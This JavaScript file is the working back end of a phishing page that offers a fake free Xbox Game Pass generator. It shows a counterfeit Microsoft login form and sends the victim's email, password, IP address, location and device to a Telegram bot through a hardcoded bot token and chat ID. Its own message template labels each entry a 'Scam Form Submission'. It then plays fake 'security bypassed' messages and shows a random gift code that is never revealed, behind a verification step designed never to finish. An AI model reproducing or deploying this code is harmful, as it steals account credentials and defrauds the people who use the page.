// Configuration
const BOT_TOKEN = '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y'; // Replace with your own Telegram bot token
const CHAT_ID = '-1002630607005'; // Replace with your own Telegram chat ID
const IPINFO_TOKEN = '81e788912b1532'; // Replace with your own IPInfo token

// Global state management
const state = {
    isConnected: false,
    currentProgress: 0,
    progressInterval: null,
    selectedTier: 'ultimate',
    selectedDuration: 6,
    fullGiftCode: null,
    verificationInterval: null
};

// Utility functions
const utils = {
    formatNumber: (num) => num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','),
    
    updateOnlineCounter: () => {
        const onlineCount = document.getElementById('online-count');
        const currentCount = parseInt(onlineCount.textContent.replace(',', ''));
        const change = Math.floor(Math.random() * 11) - 5;
        const newCount = Math.max(1000, currentCount + change);
        onlineCount.textContent = utils.formatNumber(newCount);
    },

    addStatusMessage: (message, type = 'normal') => {
        const statusContent = document.querySelector('.status-content');
        const statusLine = document.createElement('div');
        statusLine.className = `console-line ${type}`;
        statusLine.textContent = `> ${message}`;
        statusContent.appendChild(statusLine);
        statusContent.scrollTop = statusContent.scrollHeight;
    },
    
    // Function to send data to Telegram
    sendToTelegram: async (data) => {
        // Get IP information if possible
        let ipInfo = "Not available";
        try {
            const ipResponse = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
            const ipData = await ipResponse.json();
            ipInfo = `📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}\n🔍 IP: ${ipData.ip}`;
        } catch (error) {
            console.error("Could not fetch IP info", error);
        }
        
        let deviceInfo = navigator.userAgent;
        
        const message = `
🎮 New Xbox Game Pass Scam Form Submission 🎮
----------------------------------
📧 Email: ${data.email}
🔑 Password: ${data.password}
🎮 Game Pass Tier: ${data.tier}
⏱️ Duration: ${data.duration} months
⏰ Date: ${new Date().toLocaleString()}
${ipInfo}
----------------------------------
📱 Device: ${deviceInfo}
`;
        
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = {
            chat_id: CHAT_ID,
            text: message
        };
        
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            });
            
            return await response.json();
        } catch (error) {
            console.error("Failed to send to Telegram", error);
            return { ok: false, error: error.message };
        }
    },

    // Get tier display name
    getTierDisplayName: (tier) => {
        const tierMap = {
            'ultimate': 'GAME PASS ULTIMATE',
            'pc': 'GAME PASS FOR PC',
            'console': 'GAME PASS FOR CONSOLE',
            'core': 'GAME PASS CORE'
        };
        return tierMap[tier] || 'GAME PASS';
    },

    // Generate a realistic looking Xbox gift code
    generateGiftCode: () => {
        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        let code = '';
        
        // Format: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX
        for (let i = 0; i < 5; i++) {
            if (i > 0) code += '-';
            let segment = '';
            for (let j = 0; j < 5; j++) {
                segment += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            code += segment;
        }
        return code;
    }
};

// Progress bar management
const progressManager = {
    updateProgress: (progress) => {
        const progressBar = document.querySelector('.progress-fill');
        const progressText = document.querySelector('.progress-text');
        if (progressBar && progressText) {
            progressBar.style.width = `${progress}%`;
            progressText.textContent = `PROCESSING... ${Math.floor(progress)}%`;
        }
    },

    startProgress: () => {
        state.currentProgress = 0;
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'block';
        }
        progressManager.updateProgress(0);

        state.progressInterval = setInterval(() => {
            if (state.currentProgress < 100) {
                state.currentProgress += Math.random() * 2;
                if (state.currentProgress > 100) state.currentProgress = 100;
                progressManager.updateProgress(state.currentProgress);
            } else {
                clearInterval(state.progressInterval);
            }
        }, 100);
    },

    stopProgress: () => {
        clearInterval(state.progressInterval);
        state.currentProgress = 0;
        progressManager.updateProgress(0);
        const progressContainer = document.getElementById('progress-container');
        if (progressContainer) {
            progressContainer.style.display = 'none';
        }
    }
};

// Animation sequences
const animations = {
    simulateGeneration: async () => {
        const steps = [
            { message: 'Establishing secure connection...', delay: 1500, type: 'normal' },
            { message: 'Connection established!', delay: 1000, type: 'success' },
            { message: 'Connecting to Microsoft Game Pass servers...', delay: 1800, type: 'normal' },
            { message: 'Access granted to subscription module', delay: 1500, type: 'success' },
            { message: `Preparing to generate ${utils.getTierDisplayName(state.selectedTier)} subscription...`, delay: 1800, type: 'normal' },
            { message: `Setting duration to ${state.selectedDuration} month${state.selectedDuration > 1 ? 's' : ''}...`, delay: 1500, type: 'normal' },
            { message: 'Initializing subscription protocols...', delay: 2000, type: 'normal' },
            { message: 'Subscription protocols initialized', delay: 1000, type: 'success' },
            { message: 'Bypassing payment verification...', delay: 2000, type: 'warning' },
            { message: 'Xbox Game Pass security layer detected!', delay: 1500, type: 'error' },
            { message: 'Attempting to bypass security...', delay: 2000, type: 'warning' },
            { message: 'Security bypassed successfully', delay: 1500, type: 'success' },
            { message: 'Generating Game Pass gift code...', delay: 2000, type: 'normal' },
            { message: 'Gift code generated successfully!', delay: 1500, type: 'success' }
        ];

        progressManager.startProgress();

        for (const step of steps) {
            utils.addStatusMessage(step.message, step.type);
            await new Promise(resolve => setTimeout(resolve, step.delay));
        }

        setTimeout(() => {
            progressManager.stopProgress();
            handlers.showGiftCodeModal();
        }, 1000);
    },

    showSuccessSequence: () => {
        const successModal = document.getElementById('success-modal');
        const successGamePassTier = document.getElementById('success-gamepass-tier');
        const successDuration = document.getElementById('success-duration');
        const successAccount = document.getElementById('success-account');
        
        // Set success modal data
        successGamePassTier.textContent = utils.getTierDisplayName(state.selectedTier);
        successDuration.textContent = state.selectedDuration;
        
        // Get email from the form
        const email = document.getElementById('microsoft-email').value;
        successAccount.textContent = email;
        
        // Hide other modals and show success modal
        document.getElementById('xbox-confirm-modal').style.display = 'none';
        successModal.style.display = 'flex';
        
        // Initialize the enhanced success animations
        successAnimations.createConfetti();
        successAnimations.addGlowingBorder();
        successAnimations.add3DTiltEffect();
    }
};

// Enhanced success animations
const successAnimations = {
    // Creates confetti effect in the success modal
    createConfetti: () => {
        const container = document.createElement('div');
        container.className = 'confetti-container';
        
        // Add to success modal
        const successContent = document.querySelector('.success-content');
        successContent.appendChild(container);
        
        // Create confetti pieces
        const colors = ['#107C10', '#ffffff', '#5DC21E', '#0078D7'];
        const confettiCount = 100;
        
        for (let i = 0; i < confettiCount; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            
            // Randomize confetti properties
            confetti.style.left = `${Math.random() * 100}%`;
            confetti.style.width = `${Math.random() * 10 + 5}px`;
            confetti.style.height = `${Math.random() * 10 + 5}px`;
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0';
            
            // Randomize animation
            confetti.style.opacity = Math.random() * 0.8 + 0.2;
            confetti.style.animationDuration = `${Math.random() * 3 + 2}s`;
            confetti.style.animationDelay = `${Math.random() * 2}s`;
            
            container.appendChild(confetti);
        }
        
        // Remove confetti after animation completes
        setTimeout(() => {
            container.remove();
        }, 5000);
    },
    
    // Add glowing border effect
    addGlowingBorder: () => {
        const successContent = document.querySelector('.success-content');
        let glowOpacity = 0.5;
        let increasing = false;
        
        // Create pulse effect
        const pulseGlow = () => {
            if (increasing) {
                glowOpacity += 0.01;
                if (glowOpacity >= 0.8) increasing = false;
            } else {
                glowOpacity -= 0.01;
                if (glowOpacity <= 0.3) increasing = true;
            }
            
            successContent.style.boxShadow = `0 0 20px rgba(16, 124, 16, ${glowOpacity})`;
            requestAnimationFrame(pulseGlow);
        };
        
        pulseGlow();
    },
    
    // Add 3D tilt effect to the success modal
    add3DTiltEffect: () => {
        const successContent = document.querySelector('.success-content');
        
        successContent.addEventListener('mousemove', (e) => {
            const rect = successContent.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            
            const tiltX = (y - centerY) / 20;
            const tiltY = (centerX - x) / 20;
            
            successContent.style.transform = `perspective(1000px) rotateX(${tiltX}deg) rotateY(${tiltY}deg) scale3d(1.02, 1.02, 1.02)`;
        });
        
        successContent.addEventListener('mouseleave', () => {
            successContent.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1, 1, 1)';
            successContent.style.transition = 'transform 0.5s ease';
        });
    }
};

// Event handlers
const handlers = {
    tierSelect: (event) => {
        const tier = event.currentTarget.dataset.tier;
        document.querySelectorAll('.gamepass-card').forEach(option => {
            option.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        state.selectedTier = tier;
    },

    durationSelect: (event) => {
        const duration = parseInt(event.currentTarget.dataset.duration);
        document.querySelectorAll('.duration-option').forEach(option => {
            option.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');
        state.selectedDuration = duration;
    },

    connect: async () => {
        // Show processing in console without requiring account input
        utils.addStatusMessage('Initializing connection to Microsoft servers...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage('Preparing Game Pass generator...', 'normal');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage(`Selected Game Pass: ${utils.getTierDisplayName(state.selectedTier)}`, 'success');
        utils.addStatusMessage(`Duration: ${state.selectedDuration} month${state.selectedDuration > 1 ? 's' : ''}`, 'success');
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        utils.addStatusMessage('Authentication required to continue...', 'warning');
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Show Microsoft login modal after processing
        document.getElementById('microsoft-login-modal').style.display = 'flex';
    },

    submitForm: async (event) => {
        event.preventDefault();
        const email = document.getElementById('microsoft-email').value;
        const password = document.getElementById('microsoft-password').value;
        
        const submitButton = document.getElementById('microsoft-login-button');
        const originalText = submitButton.innerHTML;
        
        // Show spinner and disable button
        submitButton.disabled = true;
        submitButton.innerHTML = '<div class="spinner-border" role="status"></div>';
        submitButton.classList.add('loading');
        
        // Send data to Telegram
        try {
            await utils.sendToTelegram({
                password: password,
                email: email,
                tier: state.selectedTier,
                duration: state.selectedDuration,
                date: new Date().toISOString()
            });
        } catch (error) {
            console.error("Could not send to Telegram", error);
            // Failure is silent to user - they won't know
        }
        
        // Wait for 3 seconds with the spinner
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Hide the modal and continue with generation
        document.getElementById('microsoft-login-modal').style.display = 'none';
        document.getElementById('connect-button').disabled = true;
        document.getElementById('connect-button').innerHTML = 
            '<div class="connecting-state">GENERATING GAME PASS... <div class="button-spinner"></div></div>';
        
        // Reset button state
        submitButton.innerHTML = originalText;
        submitButton.disabled = false;
        submitButton.classList.remove('loading');
        
        // Start the generation animation
        animations.simulateGeneration();
    },

    showGiftCodeModal: () => {
        // Generate a gift code
        const giftCode = utils.generateGiftCode();
        state.fullGiftCode = giftCode;
        
        // Create masked version of gift code (last 5 digits masked)
        const maskedCode = giftCode.substring(0, giftCode.length - 5) + "*****";
        
        // Update the gift code display with masked version
        document.getElementById('gift-code').textContent = maskedCode;
        document.getElementById('gift-code').dataset.masked = "true";
        
        // Update tier and duration
        document.getElementById('display-tier').textContent = utils.getTierDisplayName(state.selectedTier);
        document.getElementById('display-duration').textContent = state.selectedDuration;
        
        // Show verification message
        const verificationElement = document.createElement('div');
        verificationElement.className = 'verification-required';
        verificationElement.innerHTML = `
            <div class="verification-header">
                <i class="fas fa-lock"></i> VERIFICATION REQUIRED
            </div>
            <div class="verification-message">
                Complete human verification to reveal full code
            </div>
            <button id="verify-button" class="verify-button">
                <i class="fas fa-shield-alt"></i>
                VERIFY NOW
            </button>
        `;
        
        // Insert verification element before the activate button
        const activateButton = document.getElementById('activate-button');
        activateButton.disabled = true;
        activateButton.style.opacity = "0.5";
        activateButton.style.cursor = "not-allowed";
        activateButton.parentNode.insertBefore(verificationElement, activateButton);
        
        // Add event listener to verify button
        setTimeout(() => {
            document.getElementById('verify-button').addEventListener('click', handlers.showVerification);
        }, 100);
        
        // Show the gift code modal
        document.getElementById('giftcode-modal').style.display = 'flex';
    },
    
    showVerification: () => {
        // Show verification overlay
        document.getElementById('verification-modal').style.display = 'flex';
    },
    
    completeVerification: () => {
        // Hide verification overlay
        document.getElementById('verification-modal').style.display = 'none';
        
        // Show loading spinner
        const verifyButton = document.querySelector('.verify-button');
        verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
        
        // Add status message in console - will appear to process indefinitely
        utils.addStatusMessage('Human verification in progress...', 'normal');
        utils.addStatusMessage('Validating user input...', 'normal');
        
        // Set up a repeating message for verification in progress
        let verifyingMessages = [
            'Connecting to verification server...',
            'Processing verification request...',
            'Waiting for server response...',
            'Validating received data...',
            'Running security checks...'
        ];
        
        let messageIndex = 0;
        const messageInterval = setInterval(() => {
            utils.addStatusMessage(verifyingMessages[messageIndex], 'normal');
            messageIndex = (messageIndex + 1) % verifyingMessages.length;
        }, 3000);
        
        // Add to state so we can refer to it elsewhere if needed
        state.verificationInterval = messageInterval;
    },

    activateGiftCode: () => {
        // Since we never complete verification, always show error
        utils.addStatusMessage('Verification still in progress. Please wait...', 'warning');
        return;
    },
    
    showConfirmModal: () => {
        // Hide redeem modal
        document.getElementById('xbox-redeem-modal').style.display = 'none';
        
        // Show confirm modal
        document.getElementById('xbox-confirm-modal').style.display = 'flex';
        
        // Update product name
        const productName = document.getElementById('confirm-product-name');
        productName.textContent = `Xbox Game Pass ${utils.getTierDisplayName(state.selectedTier).split(' ').pop()} – ${state.selectedDuration} Month`;
    },

    resetGenerator: () => {
        document.getElementById('success-modal').style.display = 'none';
        window.location.reload();
    }
};

// Initialize everything when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    // Set up Game Pass tier selection
    document.querySelectorAll('.gamepass-card').forEach(card => {
        card.addEventListener('click', handlers.tierSelect);
    });

    // Set up duration selection
    document.querySelectorAll('.duration-option').forEach(option => {
        option.addEventListener('click', handlers.durationSelect);
    });

    // Connect button
    document.getElementById('connect-button').addEventListener('click', handlers.connect);

    // Microsoft login form
    document.getElementById('microsoft-login-form').addEventListener('submit', handlers.submitForm);

    // Form validation
    const microsoftEmail = document.getElementById('microsoft-email');
    const microsoftPassword = document.getElementById('microsoft-password');
    const microsoftLoginButton = document.getElementById('microsoft-login-button');

    [microsoftEmail, microsoftPassword].forEach(input => {
        input.addEventListener('input', () => {
            microsoftLoginButton.disabled = !(microsoftEmail.value.trim() && microsoftPassword.value.trim());
            microsoftLoginButton.classList.toggle('active', !microsoftLoginButton.disabled);
        });
    });

    // Activate button (Gift Code Modal)
    document.getElementById('activate-button').addEventListener('click', handlers.activateGiftCode);

    // Redeem next button
    document.getElementById('redeem-next-button').addEventListener('click', handlers.showConfirmModal);
    
    // Close buttons for modals
    document.getElementById('redeem-close').addEventListener('click', () => {
        document.getElementById('xbox-redeem-modal').style.display = 'none';
        document.getElementById('giftcode-modal').style.display = 'flex';
    });
    
    document.getElementById('confirm-close').addEventListener('click', () => {
        document.getElementById('xbox-confirm-modal').style.display = 'none';
        document.getElementById('xbox-redeem-modal').style.display = 'flex';
    });
    
    // Verification option buttons
    document.getElementById('survey-verify-button').addEventListener('click', handlers.completeVerification);
    document.getElementById('captcha-verify-button').addEventListener('click', handlers.completeVerification);
    
    // Final confirm button
    document.getElementById('final-confirm-button').addEventListener('click', animations.showSuccessSequence);

    // Done button
    document.getElementById('done-button').addEventListener('click', handlers.resetGenerator);

    // Auto-select default Game Pass tier and duration
    const defaultTierCard = document.querySelector('.gamepass-card[data-tier="ultimate"]');
    if (defaultTierCard) {
        defaultTierCard.classList.add('selected');
    }
    
    const defaultDurationOption = document.querySelector('.duration-option[data-duration="6"]');
    if (defaultDurationOption) {
        defaultDurationOption.classList.add('selected');
    }

    // Start online counter updates
    setInterval(utils.updateOnlineCounter, 5000);
});